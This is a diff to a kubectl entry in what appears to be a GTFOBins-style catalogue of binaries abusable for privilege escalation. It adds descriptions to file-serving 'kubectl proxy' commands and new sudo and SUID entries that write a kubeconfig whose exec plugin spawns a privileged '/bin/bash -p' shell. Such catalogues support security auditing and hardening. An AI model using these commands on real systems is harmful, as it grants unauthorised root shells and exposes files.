@@ -2,20 +2,28 @@
   "functions": {
     "file-upload": [
       {
-        
+        "description": "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.",
         "code": "LFILE=dir_to_serve\nkubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
       }
     ],
     "suid": [
       {
-        
+        "description": "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.",
         "code": "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+      },
+      {
+        "description": "It pops a new privileged shell using custom configuration",
+        "code": "cat << EOF > /tmp/config\napiVersion: v1\nclusters:\n- cluster:\n    server: https://test\n  name: kubernetes\ncontexts:\n- context:\n    cluster: kubernetes\n    user: kubernetes-admin\n  name: kubernetes-admin@kubernetes\ncurrent-context: kubernetes-admin@kubernetes\nkind: Config\npreferences: {}\nusers:\n- name: kubernetes-admin\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      command: /bin/bash\n      args: \n        - \"-p\"\n        - \"-c\"\n        - \"/bin/bash -p </dev/tty >/dev/tty 2>/dev/tty\"\n      interactiveMode: Always\nEOF\n./kubectl get pods --kubeconfig=/tmp/config \n"
       }
     ],
     "sudo": [
       {
-        
+        "description": "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.",
         "code": "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+      },
+      {
+        "description": "It pops a new privileged shell using custom configuration",
+        "code": "cat << EOF > /tmp/config\napiVersion: v1\nclusters:\n- cluster:\n    server: https://test\n  name: kubernetes\ncontexts:\n- context:\n    cluster: kubernetes\n    user: kubernetes-admin\n  name: kubernetes-admin@kubernetes\ncurrent-context: kubernetes-admin@kubernetes\nkind: Config\npreferences: {}\nusers:\n- name: kubernetes-admin\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      command: /bin/bash\n      args: \n        - \"-p\"\n        - \"-c\"\n        - \"/bin/bash -p </dev/tty >/dev/tty 2>/dev/tty\"\n      interactiveMode: Always\nEOF\nsudo kubectl get pods --kubeconfig=/tmp/config \n"
       }
     ]
   }
